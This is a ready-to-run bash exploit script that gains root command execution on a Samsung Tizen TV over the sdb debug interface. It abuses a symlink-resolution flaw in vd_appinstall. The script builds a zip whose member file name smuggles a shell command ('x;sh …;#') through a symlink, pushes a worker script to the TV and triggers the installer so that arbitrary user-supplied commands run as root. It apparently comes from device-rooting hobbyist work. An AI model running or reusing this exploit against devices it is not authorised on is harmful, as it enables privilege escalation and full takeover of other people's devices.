#!/usr/bin/env bash
# tv-root-cmd.sh — run a command as root on the TV via the vd_appinstall
# symlink-resolution technique (FcoMGX, SamyGO t=14664). Non-interactive.
#
# Usage: TARGET=IP:26101 SDB=/path/to/sdb ./tv-root-cmd.sh "command1" ["command2" ...]
# Requires: native sdb (SDB env or ~/tizen-studio-cli/tools/sdb), python3.
set -Eeuo pipefail

TARGET="${TARGET:-}"
SDB_BIN="${SDB:-$HOME/tizen-studio-cli/tools/sdb}"
REMOTE_BASE="/opt/usr/apps/tmp"
[[ $# -ge 1 ]] || { echo "usage: TARGET=IP:26101 $0 \"cmd\" [\"cmd\" ...]" >&2; exit 2; }
[[ -n "$TARGET" ]] || { echo "TARGET is not set (example: TARGET=192.168.1.50:26101)" >&2; exit 2; }

RUN_ID="$(python3 -c 'import secrets;print(secrets.token_hex(6))')"
TOKEN="tvcmd${RUN_ID}"
APP_ID="TVCMD${RUN_ID}"
WORKDIR="$(mktemp -d "${TMPDIR:-/tmp}/tvcmd.XXXXXX")"
trap 'rm -rf "$WORKDIR"' EXIT

CMD_SH="$WORKDIR/cmd.sh"
WORKER="$WORKDIR/worker.sh"
CARRIER="$WORKDIR/carrier.zip"
REMOTE_CMD="$REMOTE_BASE/${TOKEN}-cmd.sh"
REMOTE_WORKER="$REMOTE_BASE/${TOKEN}-worker.sh"
REMOTE_ZIP="$REMOTE_BASE/${TOKEN}.zip"
REMOTE_DIR="$REMOTE_BASE/${TOKEN}"
READY="READY_${RUN_ID}"
DONE="DONE_${RUN_ID}"

{
  echo "#!/bin/sh"
  echo "PATH='/usr/sbin:/usr/bin:/sbin:/bin:/opt/usr/bin:/opt/bin'; export PATH"
  for c in "$@"; do printf '%s\n' "$c"; done
} > "$CMD_SH"

{
  echo "#!/bin/sh"
  echo "PATH='/usr/sbin:/usr/bin:/sbin:/bin:/opt/usr/bin:/opt/bin'; export PATH"
  echo "printf '%s\\n' '$READY'"
  echo "sh '$REMOTE_CMD' 2>&1"
  echo "printf '%s\\n' '$DONE'"
} > "$WORKER"
chmod 0755 "$CMD_SH" "$WORKER"

# carrier: metachar-named regular file + symlink to it (FcoMGX technique)
python3 - "$CARRIER" "x;sh ${REMOTE_WORKER};#" <<'PY'
import stat,sys,zipfile
zip_path,payload=sys.argv[1:]
with zipfile.ZipFile(zip_path,'w',compression=zipfile.ZIP_STORED) as z:
    r=zipfile.ZipInfo(payload); r.create_system=3
    r.external_attr=(stat.S_IFREG|0o644)<<16
    z.writestr(r,b'x\n')
    l=zipfile.ZipInfo('link'); l.create_system=3
    l.external_attr=(stat.S_IFLNK|0o777)<<16
    z.writestr(l,payload.encode())
PY

"$SDB_BIN" connect "$TARGET" >/dev/null 2>&1 || true
"$SDB_BIN" -s "$TARGET" push "$CMD_SH"  "$REMOTE_CMD"    >/dev/null
"$SDB_BIN" -s "$TARGET" push "$WORKER"  "$REMOTE_WORKER" >/dev/null
"$SDB_BIN" -s "$TARGET" push "$CARRIER" "$REMOTE_ZIP"    >/dev/null

"$SDB_BIN" -s "$TARGET" shell 0 un_zip "$TOKEN" "$TOKEN" >/dev/null 2>&1

OUT="$WORKDIR/out"
timeout_pid=""
( "$SDB_BIN" -s "$TARGET" shell 0 vd_appinstall "$APP_ID" "$REMOTE_DIR/link" ) > "$OUT" 2>&1 &
main_pid=$!
( sleep 45; kill "$main_pid" 2>/dev/null ) & timeout_pid=$!
wait "$main_pid" 2>/dev/null || true
kill "$timeout_pid" 2>/dev/null || true

cat "$OUT"
# best-effort remote cleanup
"$SDB_BIN" -s "$TARGET" shell 0 rmfile "${TOKEN}.zip" >/dev/null 2>&1 || true
